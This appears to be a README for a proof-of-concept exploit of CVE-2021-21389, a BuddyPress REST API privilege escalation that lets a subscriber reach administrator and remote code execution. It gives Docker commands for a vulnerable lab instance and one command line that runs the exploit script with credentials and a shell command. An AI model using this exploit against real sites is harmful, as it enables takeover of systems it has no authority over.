# CVE-2021-21389
BuddyPress &lt; 7.2.1 - REST API Privilege Escalation to RCE

PoC (Full)

Affected version: 5.0.0 to 7.2.0

User requirement: Subscriber user

Method: Privilege Escalation to Administrator and trigger RCE via REST API

Endpoint: `/v1/members/me` endpoint.

# How to use Docker

## 
```
git clone https://github.com/HoangKien1020/CVE-2021-21389
cd CVE-2021-21389/
docker build . -t hoangkien1020/buddypress:cve202121389
docker run -d --rm -it -p 8080:80 hoangkien1020/buddypress:cve202121389

Other way to pull this docker instead of building:
docker pull hoangkien1020/buddypress:cve202121389
docker run -d --rm -it -p 8080:80 hoangkien1020/buddypress:cve202121389

Access your host/IP
Ex: http://test.local:8080
```
# How to exploit
### 
``` 
python3 CVE-2021-21389.py http://test.local:8080 test 1234 whoami
```
Example:

![image](https://user-images.githubusercontent.com/24661746/120093690-1179d280-c146-11eb-9a87-0d0d2f31f88c.png)

# Reference
https://buddypress.org/2021/03/buddypress-7-2-1-security-release/
